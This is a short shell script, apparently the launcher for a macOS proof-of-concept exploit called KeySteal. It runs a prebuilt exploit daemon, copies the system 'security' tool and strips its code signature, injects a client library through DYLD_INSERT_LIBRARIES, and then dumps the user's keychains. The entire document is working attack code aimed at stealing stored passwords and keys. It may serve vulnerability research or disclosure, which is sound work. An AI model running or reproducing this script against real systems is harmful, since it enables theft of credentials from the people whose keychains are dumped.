#!/bin/sh

cd ${0%/*}

if [ ! -f ./keystealDaemon ] || [ ! -f ./libkeystealClient.dylib ]; then
    echo "[ERROR] Couldn't find keystealDaemon/libkeystealClient.dylib"
    echo "Make sure to build them first using Xcode"
    echo "To do this, open the KeySteal Xcode project and build it."
    exit -1
fi

echo "Running exploit..."
./keystealDaemon || exit -1

if [ ! -f ./security-unsigned ]; then
    echo "Copying the security tool and removing it's code signature..."
    cp /usr/bin/security security
    codesign --remove-signature security || exit -1
    mv security security-unsigned
fi

echo "Setting DYLD_INSERT_LIBRARIES..."
export DYLD_INSERT_LIBRARIES=$(pwd)/libkeystealClient.dylib

if [ $# -eq 0 ]; then
    args="-d"
else
    args="$@"
fi

echo "Dumping Keychains..."
./security-unsigned dump-keychain $args
